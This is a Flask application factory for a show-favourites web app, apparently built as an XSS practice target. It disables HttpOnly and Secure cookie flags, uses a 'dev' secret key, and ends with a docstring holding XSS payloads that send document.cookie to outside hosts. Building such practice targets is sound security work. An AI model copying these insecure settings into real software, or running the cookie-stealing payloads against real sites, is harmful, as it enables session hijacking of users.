import os

from flask import Flask, render_template


def create_app(test_config=None):
    # create and configure the app
    app = Flask(__name__, instance_relative_config=True)
    app.config.from_mapping(
        SECRET_KEY='dev',
        DATABASE=os.path.join(app.instance_path, 'myfavshows.sqlite'),
        SESSION_COOKIE_HTTPONLY=False,
        REMEMBER_COOKIE_HTTPONLY=False,
        SESSION_COOKIE_SECURE=False,
    )

    if test_config is None:
        # load the instance config, if it exists, when not testing
        app.config.from_pyfile('config.py', silent=True)
    else:
        # load the test config if passed in
        app.config.from_mapping(test_config)

    # ensure the instance folder exists
    try:
        os.makedirs(app.instance_path)
    except OSError:
        pass

    # App context imports
    from . import db
    db.init_app(app)

    from . import auth
    app.register_blueprint(auth.bp)

    from . import search
    app.register_blueprint(search.bp)

    from . import myfav
    app.register_blueprint(myfav.bp)

    from . import myshow
    app.register_blueprint(myshow.bp)

    from . import blog
    app.register_blueprint(blog.bp)

    @app.route('/about', methods=('GET',))
    def about():
        """About page"""
        return render_template('about.html')

    @app.route('/error', methods=('GET',))
    def error():
        """Error occurance page"""
        return render_template('error.html')

    return app


"""
set FLASK_APP=myfavshows
set FLASK_ENV=development
flask run

<script>alert('test');</script>
<script>document.write('<img src="http://localhost/submitcookie.php?cookie=' + escape(document.cookie) + '" />');</script>
<script>new Image().src="http://192.168.1.80/b.php?cookie="+document.cookie;</script>
"""
